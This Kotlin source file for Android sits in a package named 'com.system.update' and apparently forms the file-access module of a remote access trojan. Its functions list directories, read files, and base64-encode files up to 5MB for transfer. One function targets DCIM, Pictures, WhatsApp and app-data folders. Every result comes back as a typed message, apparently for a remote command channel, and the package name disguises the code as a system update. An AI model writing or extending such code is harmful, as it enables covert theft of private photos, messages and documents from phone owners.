package com.system.update

import android.content.Context
import android.os.Build
import android.os.Environment
import android.util.Base64
import java.io.File
import java.text.DecimalFormat

object FileManager {

    fun listFiles(path: String): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val dir = File(path)
            if (!dir.exists() || !dir.isDirectory) {
                return mapOf("type" to "files", "items" to list, "error" to "not a directory")
            }

            dir.listFiles()?.sortedBy { it.name }?.forEach { f ->
                try {
                    list.add(mapOf(
                        "name" to f.name,
                        "path" to f.absolutePath,
                        "size" to formatSize(f.length()),
                        "is_dir" to f.isDirectory.toString()
                    ))
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return mapOf("type" to "files", "items" to list, "path" to path)
    }

    fun readFile(path: String): Map<String, Any> {
        return try {
            val f = File(path)
            if (!f.exists() || !f.isFile) {
                return mapOf("type" to "text", "data" to "File tidak ditemukan")
            }
            val size = f.length()
            if (size > 500_000) {
                return mapOf("type" to "text", "data" to "File terlalu besar (>500KB)")
            }
            val content = f.readText()
            mapOf(
                "type" to "file_content",
                "path" to path,
                "content" to content
            )
        } catch (e: Exception) {
            mapOf("type" to "text", "data" to "Error: ${e.message}")
        }
    }

    fun downloadFile(path: String): Map<String, Any> {
        return try {
            val f = File(path)
            if (!f.exists() || !f.isFile) {
                return mapOf("type" to "text", "data" to "File tidak ditemukan")
            }
            val size = f.length()
            if (size > 5_000_000) {
                return mapOf("type" to "text", "data" to "File terlalu besar (>5MB)")
            }
            val bytes = f.readBytes()
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val mime = when (f.extension.lowercase()) {
                "jpg", "jpeg" -> "image/jpeg"
                "png" -> "image/png"
                "gif" -> "image/gif"
                "mp4" -> "video/mp4"
                "mp3" -> "audio/mpeg"
                "pdf" -> "application/pdf"
                "txt" -> "text/plain"
                "apk" -> "application/vnd.android.package-archive"
                else -> "application/octet-stream"
            }
            mapOf(
                "type" to "file_base64",
                "name" to f.name,
                "mime" to mime,
                "data" to b64
            )
        } catch (e: Exception) {
            mapOf("type" to "text", "data" to "Error: ${e.message}")
        }
    }

    fun listStorageRoots(): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        val common = listOf(
            "/storage/emulated/0",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Documents",
            "/storage/emulated/0/Music",
            "/storage/emulated/0/Movies",
            "/storage/emulated/0/WhatsApp",
            "/storage/emulated/0/Android/data"
        )
        common.forEach { p ->
            val f = File(p)
            if (f.exists()) {
                list.add(mapOf(
                    "name" to f.name.ifEmpty { "Internal Storage" },
                    "path" to p,
                    "size" to "-",
                    "is_dir" to "true"
                ))
            }
        }
        return mapOf("type" to "files", "items" to list, "path" to "/")
    }

    private fun formatSize(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return DecimalFormat("#.#").format(kb) + " KB"
        val mb = kb / 1024.0
        if (mb < 1024) return DecimalFormat("#.#").format(mb) + " MB"
        val gb = mb / 1024.0
        return DecimalFormat("#.#").format(gb) + " GB"
    }
}
